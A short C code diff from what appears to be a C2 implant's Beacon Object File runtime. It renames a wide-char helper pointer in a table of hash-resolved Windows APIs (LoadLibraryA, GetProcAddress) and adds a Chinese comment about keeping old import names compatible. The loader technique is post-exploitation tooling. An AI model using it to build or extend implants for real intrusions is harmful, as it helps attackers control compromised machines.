@@ -5,8 +5,9 @@ VOID BofInitLdrApi(BofJobRuntime* runtime, BeaconContext* ctx)
 {
     if (!runtime || !ctx) return;
 
+    /* 兼容 BOF 侧旧导入名，同时内部函数名保持 Windows 风格。 */
     runtime->ldr_api[0].NameHash = TOWIDECHAR_HASH;
-    runtime->ldr_api[0].Pointer  = (PVOID)toWideChar;
+    runtime->ldr_api[0].Pointer  = (PVOID)ToWideCharA;
     runtime->ldr_api[1].NameHash = LOADLIBRARYA_HASH;
     runtime->ldr_api[1].Pointer  = (PVOID)ctx->api.pfnLoadLibraryA;
     runtime->ldr_api[2].NameHash = GETPROCADDRESS_HASH;
